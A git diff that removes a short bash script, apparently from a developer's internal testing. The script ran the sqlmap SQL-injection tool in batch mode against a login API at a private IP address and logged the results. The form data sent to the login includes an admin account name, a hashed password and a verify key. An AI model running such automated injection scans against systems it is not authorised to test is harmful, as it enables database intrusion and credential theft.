@@ -1,2 +1,0 @@
-#!/bin/bash
-python /Users/zhaichuang/Downloads/sqlmapproject-sqlmap-1c737d7/sqlmap.py -u "http://172.16.56.199/api/whistleMS/index.php" --data "m=user&a=userLogin&device_type=web&account=admin_ligong&password=e10adc3949ba59abbe56e057f20f883e&verify_key=84f9a4f61d0b7149a9b9e23d04499c39&user_type=admin" --level=1 --batch >>/Users/zhaichuang/Desktop/python/GjWshile/MS/MS_logfiles/4.log
